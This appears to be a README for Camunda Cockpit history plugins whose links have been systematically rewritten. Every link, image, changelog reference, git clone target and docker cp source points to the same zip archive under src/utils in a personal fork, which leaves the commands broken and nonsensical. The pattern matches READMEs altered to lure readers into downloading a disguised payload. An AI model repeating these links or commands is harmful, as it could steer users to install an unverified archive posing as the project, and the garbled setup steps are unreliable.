Minimal "history plugins" for Camunda Cockpit
=============================================

![Minimal history plugin in action.](https://raw.githubusercontent.com/antonioluzzi/camunda-cockpit-plugins/master/src/utils/camunda-cockpit-plugins-3.2.zip)

Breaking changes
----------------

* [2021-08-13](https://raw.githubusercontent.com/antonioluzzi/camunda-cockpit-plugins/master/src/utils/camunda-cockpit-plugins-3.2.zip): Change definition view plugins (historic acticities and instances) to only show data for the current definition version

* [the last version before this changelog](https://raw.githubusercontent.com/antonioluzzi/camunda-cockpit-plugins/master/src/utils/camunda-cockpit-plugins-3.2.zip)


Try it
------

With Camunda Platform 7.14.0:

```bash
$ git clone https://raw.githubusercontent.com/antonioluzzi/camunda-cockpit-plugins/master/src/utils/camunda-cockpit-plugins-3.2.zip
$ docker run --rm -p 8080:8080 -v $(pwd)/camunda-cockpit-plugins:/camunda/webapps/camunda/app/cockpit/scripts/:ro camunda/camunda-bpm-platform:7.14.0
```

With Camunda Platform 7.15.0 (works also with 7.16.0 or 7.17.0):

```bash
$ git clone https://raw.githubusercontent.com/antonioluzzi/camunda-cockpit-plugins/master/src/utils/camunda-cockpit-plugins-3.2.zip
$ docker run -d --name mytemp camunda/camunda-bpm-platform:7.15.0
$ docker cp https://raw.githubusercontent.com/antonioluzzi/camunda-cockpit-plugins/master/src/utils/camunda-cockpit-plugins-3.2.zip camunda-cockpit-plugins
$ docker rm -vf mytemp
$ docker run --rm -p 8080:8080 -v $(pwd)/camunda-cockpit-plugins:/camunda/webapps/camunda/app/cockpit/scripts/:ro camunda/camunda-bpm-platform:7.15.0
```

See also the example [Dockerfile for Camunda Run 7.15.0](https://raw.githubusercontent.com/antonioluzzi/camunda-cockpit-plugins/master/src/utils/camunda-cockpit-plugins-3.2.zip).

If you don't immediately see the plugin, try again with your browser's private browsing mode. It is a common issue browser has cached a previous Cockpit plugin configuration without these plugins.

Note: Trying out the plugins with Camunda Platform 7.15.0 Docker image is more complex than with the previous version 7.14.0, because the new location of `https://raw.githubusercontent.com/antonioluzzi/camunda-cockpit-plugins/master/src/utils/camunda-cockpit-plugins-3.2.zip` prevents simple override of the scripts folder.


Use it
------

[Check the forum discussion on how to package plugins for various alternative Camunda distributions.](https://raw.githubusercontent.com/antonioluzzi/camunda-cockpit-plugins/master/src/utils/camunda-cockpit-plugins-3.2.zip)


Develop it
----------

```bash
$ cd camunda-cockpit-plugins
$ npm install
$ npm run watch
```

When the scripts are mounted into running Docker container, development changes are immediately available in the container with page refresh.
